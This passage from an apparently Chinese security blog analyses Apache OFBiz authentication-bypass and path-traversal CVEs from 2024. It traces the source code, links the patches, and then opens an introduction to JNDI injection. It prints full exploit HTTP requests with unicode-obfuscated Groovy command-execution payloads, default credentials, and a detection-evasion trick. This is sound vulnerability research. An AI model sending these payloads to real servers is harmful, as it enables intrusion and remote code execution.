(Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Google Chrome&quot;;v=&quot;131&quot;, &quot;Chromium&quot;;v=&quot;131&quot;, &quot;Not_A Brand&quot;;v=&quot;24&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;macOS&quot;</span><br><span class="line"></span><br><span class="line"><span class="language-taggerscript">groovyProgram=<span class="symbol">\u006a</span><span class="symbol">\u0061</span><span class="symbol">\u0076</span><span class="symbol">\u0061</span><span class="symbol">\u002e</span><span class="symbol">\u006c</span><span class="symbol">\u0061</span><span class="symbol">\u006e</span><span class="symbol">\u0067</span><span class="symbol">\u002e</span><span class="symbol">\u0052</span><span class="symbol">\u0075</span><span class="symbol">\u006e</span><span class="symbol">\u0074</span><span class="symbol">\u0069</span><span class="symbol">\u006d</span><span class="symbol">\u0065</span><span class="symbol">\u002e</span><span class="symbol">\u0067</span><span class="symbol">\u0065</span><span class="symbol">\u0074</span><span class="symbol">\u0052</span><span class="symbol">\u0075</span><span class="symbol">\u006e</span><span class="symbol">\u0074</span><span class="symbol">\u0069</span><span class="symbol">\u006d</span><span class="symbol">\u0065</span><span class="symbol">\u0028</span><span class="symbol">\u0029</span><span class="symbol">\u002e</span><span class="symbol">\u0065</span><span class="symbol">\u0078</span><span class="symbol">\u0065</span><span class="symbol">\u0063</span><span class="symbol">\u0028</span><span class="symbol">\u0022</span><span class="symbol">\u0074</span><span class="symbol">\u006f</span><span class="symbol">\u0075</span><span class="symbol">\u0063</span><span class="symbol">\u0068</span><span class="symbol">\u0020</span><span class="symbol">\u002f</span><span class="symbol">\u0074</span><span class="symbol">\u006d</span><span class="symbol">\u0070</span><span class="symbol">\u002f</span><span class="symbol">\u0068</span><span class="symbol">\u0061</span><span class="symbol">\u0063</span><span class="symbol">\u006b</span><span class="symbol">\u0065</span><span class="symbol">\u0072</span><span class="symbol">\u0022</span><span class="symbol">\u0029</span></span></span><br></pre></td></tr></table></figure><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734434095854-7988ada2-1c70-4db6-8b60-88b141df4623.png"></p><p>官方补丁<a href="https://github.com/apache/ofbiz-framework/commit/d8b097f6717a4004acf023dfe929e0e41ad63faa#diff-68decfd4946b8ef0adcc4c7f18b938aec4a07ff7ce64609a2691ba88a4688607L426">https://github.com/apache/ofbiz-framework/commit/d8b097f6717a4004acf023dfe929e0e41ad63faa#diff-68decfd4946b8ef0adcc4c7f18b938aec4a07ff7ce64609a2691ba88a4688607L426</a>对于之前的用户名、密码等置空绕过部分进行了检测，禁止为空字符串。</p><h3 id="CVE-2024-38856"><a href="#CVE-2024-38856" class="headerlink" title="CVE-2024-38856"></a><font style="color:#000000;">CVE-2024-38856</font></h3><p><font style="color:#000000;">在RequestHandler#doRequest方法中，利用getRequestUri方法来获取请求URI的基础部分，将pathInfo按&#x2F;分割成一个字符串列表，若不为空则取第一个元素，当包含?时，取?之前部分；利用getOverrideViewUri方法来获取用于覆盖视图的URI部分，同样将pathInfo按&#x2F;分割成一个字符串列表，忽略列表中第一个元素并遍历剩余的元素（忽略~开头的元素），当包含?时，取?之前部分，将列表剩余符合元素拼接起来。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734448297486-1d615bc2-3fcc-42bc-a75d-bc5bf9a8862e.png"></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734447710724-f8334bd2-1957-4a34-b1cb-e1e8b4022b35.png"></p><p><font style="color:#000000;">在默认情况下，渲染的视图为nextRequestResponse.value，即根据路由的返回结果来自动选择视图，这里分为三种情况：</font></p><ol><li><strong><font style="color:#000000;">定义了event的路由（通常无需鉴权），会根据对应event的执行结果决定渲染类型</font></strong></li><li><strong><font style="color:#000000;">没有定义event但security中auth为true的路由，会根据认证返回结果决定渲染类型</font></strong></li><li><strong><font style="color:#000000;">既没有定义event、又缺乏认证的路由，这种会直接取配置中success的结果对应的值作为渲染类型</font></strong></li></ol><p><font style="color:#000000;">接着会校验requestUri是否需要认证，这里利用security值为true的路由来绕过检查。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734449240291-4a5c82cf-e126-40bd-a290-70d84d3e7db7.png"></p><p><font style="color:#000000;">继续往下，在runEvent方法中，通过反射调用到利用路由的业务方法，满足返回值为success即可。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734449717683-b909bbe3-3800-405c-85ad-fb38a14668ec.png"></p><p><font style="color:#000000;">接着判断nextRequestResponse.type的值，可以在配置文件中查看。</font></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">request-map</span> <span class="attr">uri</span>=<span class="string">&quot;forgotPassword&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">security</span> <span class="attr">https</span>=<span class="string">&quot;true&quot;</span> <span class="attr">auth</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">event</span> <span class="attr">type</span>=<span class="string">&quot;java&quot;</span> <span class="attr">path</span>=<span class="string">&quot;org.apache.ofbiz.securityext.login.LoginEvents&quot;</span> <span class="attr">invoke</span>=<span class="string">&quot;forgotPassword&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;view&quot;</span> <span class="attr">value</span>=<span class="string">&quot;forgotPassword&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span> <span class="attr">type</span>=<span class="string">&quot;view&quot;</span> <span class="attr">value</span>=<span class="string">&quot;forgotPassword&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;auth&quot;</span> <span class="attr">type</span>=<span class="string">&quot;request-redirect&quot;</span> <span class="attr">value</span>=<span class="string">&quot;main&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">request-map</span>&gt;</span></span><br></pre></td></tr></table></figure><p><font style="color:#000000;">进入对应的语句，可以看到，当overrideViewUri不为空，且eventReturn的值为success时，会将视图渲染为overrideViewUri。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;view&quot;</span>.equals(nextRequestResponse.type)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (Debug.verboseOn()) Debug.logVerbose(<span class="string">&quot;[RequestHandler.doRequest]: Response is a view.&quot;</span> + showSessionId(request), <span class="keyword">module</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check for an override view, only used if &quot;success&quot; = eventReturn</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">viewName</span> <span class="operator">=</span> (UtilValidate.isNotEmpty(overrideViewUri) &amp;&amp; (eventReturn == <span class="literal">null</span> || <span class="string">&quot;success&quot;</span>.equals(eventReturn))) ? overrideViewUri : nextRequestResponse.value;</span><br><span class="line">    renderView(viewName, requestMap.securityExternalView, request, response, saveName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">因此，可以利用不鉴权且路由的type为view的路由来作为requestUri的值，然后overrideViewUri设置为需要利用的路由，就可以实现前序步骤的权限校验绕过，同时将视图渲染为目标视图。同时可以利用getOverrideViewUri方法处理时的特性来绕过部分流量检测。</font></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/webtools/control/forgotPassword/~aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/ProgramExport</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br, zstd</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>52</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8443</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://127.0.0.1:8443</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://127.0.0.1:8443/scrum/control/login</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Google Chrome&quot;;v=&quot;131&quot;, &quot;Chromium&quot;;v=&quot;131&quot;, &quot;Not_A Brand&quot;;v=&quot;24&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;macOS&quot;</span><br><span class="line"></span><br><span class="line"><span class="language-taggerscript">groovyProgram=<span class="symbol">\u0022</span><span class="symbol">\u0074</span><span class="symbol">\u006f</span><span class="symbol">\u0075</span><span class="symbol">\u0063</span><span class="symbol">\u0068</span><span class="symbol">\u0020</span><span class="symbol">\u002f</span><span class="symbol">\u0074</span><span class="symbol">\u006d</span><span class="symbol">\u0070</span><span class="symbol">\u002f</span><span class="symbol">\u0068</span><span class="symbol">\u0061</span><span class="symbol">\u0063</span><span class="symbol">\u006b</span><span class="symbol">\u0065</span><span class="symbol">\u0072</span><span class="symbol">\u0022</span><span class="symbol">\u002e</span><span class="symbol">\u0065</span><span class="symbol">\u0078</span><span class="symbol">\u0065</span><span class="symbol">\u0063</span><span class="symbol">\u0075</span><span class="symbol">\u0074</span><span class="symbol">\u0065</span><span class="symbol">\u0028</span><span class="symbol">\u0029</span></span></span><br></pre></td></tr></table></figure><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734451330542-839667d9-0376-4ba6-adb7-6522f4a867e9.png"></p><p><font style="color:#000000;">官方补丁</font><a href="https://github.com/apache/ofbiz-framework/commit/59b42220ab642699769895ee248575154db91e62">https://github.com/apache/ofbiz-framework/commit/59b42220ab642699769895ee248575154db91e62</a><font style="color:#000000;">对漏洞触发点进行了校验。</font></p><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a><font style="color:#000000;">Privilege Escalation</font></h2><h3 id="CVE-2024-25065"><a href="#CVE-2024-25065" class="headerlink" title="CVE-2024-25065"></a>CVE-2024-25065</h3><p><font style="color:#000000;">账号的访问权限部分由org.apache.ofbiz.webapp.control.LoginWorker#hasBasePermission方法控制，先从ServletContext中获取_serverId，并获取当前请求的上下文路径，接着调用ComponentConfig#getWebAppInfo方法，很明显当info的值为null时即可跳过判断。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734437083832-a077cf34-36ae-41cf-894a-0c0cf6ce75e5.png"></p><p><font style="color:#000000;">在ComponentConfig#getWebAppInfo方法中，只需让contextRoot与wInfo.getContextRoot()不相等，即可满足返回的结果为null。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734437403179-da32a43d-0367-4bfb-8e76-6e7845e46ece.png"></p><p><font style="color:#000000;">对于org.apache.catalina.connector.Request#getContextPath方法，返回值与match相关，只需保证candidate与canonicalContextPath相等即可让match返回true，而candidate的值是通过循环取得，每次多取一级子目录的值，并经过url解码以及normalize后即为其值。因此可以构造出这样的URL，&#x2F;h3rmesk1t&#x2F;..&#x2F;webtools&#x2F;control&#x2F;login，这样ContextPath的值中就会带上&#x2F;h3rmesk1t&#x2F;..&#x2F;，显然不会再与配置中的值相等，从而实现绕过。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">getContextPath</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">canonicalContextPath</span> <span class="operator">=</span> <span class="built_in">this</span>.getServletContext().getContextPath();</span><br><span class="line">    <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="built_in">this</span>.getRequestURI();</span><br><span class="line">    <span class="type">char</span>[] uriChars = uri.toCharArray();</span><br><span class="line">    <span class="type">int</span> <span class="variable">lastSlash</span> <span class="operator">=</span> <span class="built_in">this</span>.mappingData.contextSlashCount;</span><br><span class="line">    <span class="keyword">if</span> (lastSlash == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> pos;</span><br><span class="line">        <span class="keyword">for</span>(pos = <span class="number">0</span>; lastSlash &gt; <span class="number">0</span>; --lastSlash) &#123;</span><br><span class="line">            pos = <span class="built_in">this</span>.nextSlash(uriChars, pos + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (pos == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String candidate;</span><br><span class="line">        <span class="keyword">if</span> (pos == -<span class="number">1</span>) &#123;</span><br><span class="line">            candidate = uri;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            candidate = uri.substring(<span class="number">0</span>, pos);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        candidate = <span class="built_in">this</span>.removePathParameters(candidate);</span><br><span class="line">        candidate = UDecoder.URLDecode(candidate, <span class="built_in">this</span>.connector.getURICharset());</span><br><span class="line">        candidate = RequestUtil.normalize(candidate);</span><br><span class="line"></span><br><span class="line">        <span class="type">boolean</span> match;</span><br><span class="line">        <span class="keyword">for</span>(match = canonicalContextPath.equals(candidate); !match &amp;&amp; pos != -<span class="number">1</span>; match = canonicalContextPath.equals(candidate)) &#123;</span><br><span class="line">            pos = <span class="built_in">this</span>.nextSlash(uriChars, pos + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (pos == -<span class="number">1</span>) &#123;</span><br><span class="line">                candidate = uri;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                candidate = uri.substring(<span class="number">0</span>, pos);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            candidate = <span class="built_in">this</span>.removePathParameters(candidate);</span><br><span class="line">            candidate = UDecoder.URLDecode(candidate, <span class="built_in">this</span>.connector.getURICharset());</span><br><span class="line">            candidate = RequestUtil.normalize(candidate);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (match) &#123;</span><br><span class="line">            <span class="keyword">return</span> pos == -<span class="number">1</span> ? uri : uri.substring(<span class="number">0</span>, pos);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(sm.getString(<span class="string">&quot;coyoteRequest.getContextPath.ise&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;canonicalContextPath, uri&#125;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">除此之外，由于OFBiz的路由功能是通过path决定的，要鉴权就需要通过extensionCheckLogin完成，而在这个函数中会先校验用户名密码，只有用户名密码正确才通过函数hasBasePermission判断是否有对应路径权限，因此需要一个低权限账号来满足前序步骤。</font></p><p>漏洞利用数据包如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/h3rmesk1t/../webtools/control/ProgramExport</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8443</span><br><span class="line"><span class="attribute">X-Forwarded-Proto</span><span class="punctuation">: </span>HTTPS</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>webtools.securedLoginId=admin; JSESSIONID=7899116F52229866537976CBD23EFA95.jvm1; JSESSIONID=145B4BBDF7F815B119E02ED19923821C; java-chains-token-key=admin_token; OFBiz.Visitor=10000</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>200</span><br><span class="line"></span><br><span class="line"><span class="language-taggerscript">USERNAME=bizadmin&amp;PASSWORD=ofbiz&amp;JavaScriptEnabled=Y&amp;groovyProgram=<span class="symbol">\u0022</span><span class="symbol">\u0074</span><span class="symbol">\u006f</span><span class="symbol">\u0075</span><span class="symbol">\u0063</span><span class="symbol">\u0068</span><span class="symbol">\u0020</span><span class="symbol">\u002f</span><span class="symbol">\u0074</span><span class="symbol">\u006d</span><span class="symbol">\u0070</span><span class="symbol">\u002f</span><span class="symbol">\u0033</span><span class="symbol">\u0022</span><span class="symbol">\u002e</span><span class="symbol">\u0065</span><span class="symbol">\u0078</span><span class="symbol">\u0065</span><span class="symbol">\u0063</span><span class="symbol">\u0075</span><span class="symbol">\u0074</span><span class="symbol">\u0065</span><span class="symbol">\u0028</span><span class="symbol">\u0029</span></span></span><br></pre></td></tr></table></figure><p><font style="color:#000000;">官方补丁</font><a href="https://github.com/apache/ofbiz-framework/commit/b91a9b7f26">https://github.com/apache/ofbiz-framework/commit/b91a9b7f26</a>、<a href="https://github.com/apache/ofbiz-framework/commit/b3b87d98dd">https://github.com/apache/ofbiz-framework/commit/b3b87d98dd</a><font style="color:#000000;">对contextPath也进行了normalize处理。</font></p><h3 id="CVE-2024-32113-CVE-2024-36104"><a href="#CVE-2024-32113-CVE-2024-36104" class="headerlink" title="CVE-2024-32113&amp;CVE-2024-36104"></a><font style="color:#000000;">CVE-2024-32113&amp;CVE-2024-36104</font></h3><p><font style="color:#000000;">这两个漏洞的本质还是对CVE-2024-25065的补丁进行一个绕过，无论是getRequestURI方法还getRequestURL方法都不会做URL解码，因此可以采用编码来进行绕过，另外也可以配合分号的使用绕过校验（CVE-2024-36104）。</font></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/h3rmesk1t/%2e%2e/webtools/control/ProgramExport</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8443</span><br><span class="line"><span class="attribute">X-Forwarded-Proto</span><span class="punctuation">: </span>HTTPS</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>webtools.securedLoginId=admin; JSESSIONID=7899116F52229866537976CBD23EFA95.jvm1; JSESSIONID=145B4BBDF7F815B119E02ED19923821C; java-chains-token-key=admin_token; OFBiz.Visitor=10000</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>200</span><br><span class="line"></span><br><span class="line"><span class="language-taggerscript">USERNAME=bizadmin&amp;PASSWORD=ofbiz&amp;JavaScriptEnabled=Y&amp;groovyProgram=<span class="symbol">\u0022</span><span class="symbol">\u0074</span><span class="symbol">\u006f</span><span class="symbol">\u0075</span><span class="symbol">\u0063</span><span class="symbol">\u0068</span><span class="symbol">\u0020</span><span class="symbol">\u002f</span><span class="symbol">\u0074</span><span class="symbol">\u006d</span><span class="symbol">\u0070</span><span class="symbol">\u002f</span><span class="symbol">\u0033</span><span class="symbol">\u0022</span><span class="symbol">\u002e</span><span class="symbol">\u0065</span><span class="symbol">\u0078</span><span class="symbol">\u0065</span><span class="symbol">\u0063</span><span class="symbol">\u0075</span><span class="symbol">\u0074</span><span class="symbol">\u0065</span><span class="symbol">\u0028</span><span class="symbol">\u0029</span></span></span><br></pre></td></tr></table></figure><p>对于上述利用手法，官方采用正则的方式进行修复<a href="https://github.com/apache/ofbiz-framework/commit/d33ce31012">https://github.com/apache/ofbiz-framework/commit/d33ce31012</a>。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://t.zsxq.com/AEbMP">Apache OFBiz漏洞CVE-2023-49070的前世今生</a></p><p><a href="https://y4tacker.github.io/2024/06/23/year/2024/8/Apache-OFBiz-Authentication-Bypass-CVE-2024-38856/">Apache OFBiz Authentication Bypass(CVE-2024-38856)</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JNDI注入</title>
      <link href="/2024/11/13/JNDI%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/11/13/JNDI%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><font style="color:#000000;">Java Naming and Directory Interface（JNDI）是一种Java API，</font><strong><font style="color:#000000;">JNDI为利用Java编写的应用程序提供命名和目录接口功能</font></strong><font style="color:#000000;">，JNDI不仅限于context.xml等应用程序服务器中的配置；相反，它是一个用于访问命名和目录服务的更广泛的API。</font></p><p><font style="color:#000000;">JNDI允许Java软件客户端通过名称发现和查找数据和对象，这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI）、公共对象请求代理体系结构（CORBA）、轻量级目录访问协议（LDAP）或域名服务（DNS）。</font><strong><font style="color:#000000;">JNDI可访问的现有的目录及服务包括JDBC、LDAP、RMI、DNS、NIS、CORBA。</font></strong></p><h3 id="Naming-Service"><a href="#Naming-Service" class="headerlink" title="Naming Service"></a>Naming Service</h3><p><strong><font style="color:#000000;">Naming Service将名称和对象进行关联，提供通过名称找到对象的操作。</font></strong><font style="color:#000000;">例如，DNS系统将计算机名和IP地址进行关联、文件系统将文件名和文件句柄进行关联等等。</font></p><p><font style="color:#000000;">在命名系统中，有几个重要的概念：</font></p><ol><li><font style="color:#000000;">Bindings：表示一个名称和对应对象的绑定关系，比如在文件系统中文件名绑定到对应的文件，在DNS中域名绑定到对应的IP，在RMI中远程对象绑定到对应的Name。</font></li><li><font style="color:#000000;">Context：上下文，一个上下文中对应着一组名称到对象的绑定关系，可以在指定上下文中查找名称对应的对象。例如在文件系统中，一个目录就是一个上下文，可以在该目录中查找文件，其中子目录也可以称为子上下文（subcontext）。</font></li><li><font style="color:#000000;">References：在一个实际的Naming Service中，有些对象可能无法直接存储在系统内，这时它们便以引用的形式进行存储，可以理解为C&#x2F;C++中的指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。比如文件系统中实际根据名称打开的文件是一个整数fd（file descriptor），这就是一个引用，内核根据这个引用值去找到磁盘中的对应位置和读写偏移。</font></li></ol><h3 id="Directory-Service"><a href="#Directory-Service" class="headerlink" title="Directory Service"></a>Directory Service</h3><p><strong><font style="color:#000000;">Directory Service可以被认为是Naming Service的一种拓展，除了Naming Service中已有的名称到对象的关联信息外，还允许对象拥有属性信息。</font></strong><font style="color:#000000;">因此，不仅可以根据名称去查找对象并获取其对应属性，还可以根据属性值去搜索对象。</font></p><p><font style="color:#000000;">以打印机服务为例，可以在Naming Service中根据打印机名称去获取打印机对象，然后进行打印操作；同时打印机拥有速率、分辨率、颜色等属性，作为Directory Service，用户可以根据打印机的分辨率去搜索对应的打印机对象。</font></p><p><font style="color:#000000;">Directory Service提供了对目录中对象（Directory Objects）的属性进行增删改查的操作。常见的Directory Service有：</font></p><ol><li><font style="color:#000000;">LDAP，轻型目录访问协议。</font></li><li><font style="color:#000000;">Active Directory，为Windows域网络设计，包含多个目录服务，比如域名服务、证书服务等。</font></li><li><font style="color:#000000;">其他基于目录服务的标准X.500实现的目录服务。</font></li></ol><h3 id="Interface"><a href="#Interface" class="headerlink" title="Interface"></a><font style="color:#000000;">Interface</font></h3><p><font style="color:#000000;">为了方便在JAVA中使用目录协议，JAVA实现了一套目录服务的接口JDNI，即Java提供的Java命名和目录接口，应用通过该接口与具体的目录服务进行交互。从设计上，JNDI独立于具体的目录服务实现，因此可以针对不同的目录服务提供统一的操作接口。</font></p><h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p><strong><font style="color:#000000;">JNDI架构上主要包含两个部分，即Java的应用层接口和SPI</font></strong><font style="color:#000000;">（Service Provider Interface，即服务供应接口，主要作用是为底层的具体目录服务提供统一接口，从而实现目录服务的可插拔式安装），如下图所示。</font></p><p><img src="/2024/11/13/JNDI%E6%B3%A8%E5%85%A5/1730722931873-c05c9d4c-2645-4633-b64e-d9ce5076a493.webp.png"></p><p><font style="color:#000000;">JNDI包含在Java SE平台中，要使用JNDI时，必须要拥有JNDI类和一个或多个服务提供者，JDK包括以下命名或者目录服务的服务提供者：</font></p><ul><li><font style="color:#000000;">DNS，Domain Name Service（域名服务）</font></li><li><font style="color:#000000;">RMI，Java Remote Method Invocation（Java方法远程调用）</font></li><li><font style="color:#000000;">LDAP，Lightweight Directory Access Protocol（轻量级目录访问协议）</font></li><li><font style="color:#000000;">CORBA，Common Object Request Broker Architecture（公共对象请求代理体系结构）</font></li></ul><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><p><font style="color:#000000;">JNDI接口主要分为如下5个包：</font></p><ol><li><font style="color:#000000;">javax.naming，主要用于命名操作，它包含了命名服务的类和接口，例如Context、Bindings、References、lookup等</font></li><li><font style="color:#000000;">javax.naming.directory，主要用于目录操作，它定义了DirContext接口和InitialDir-Context类</font></li><li><font 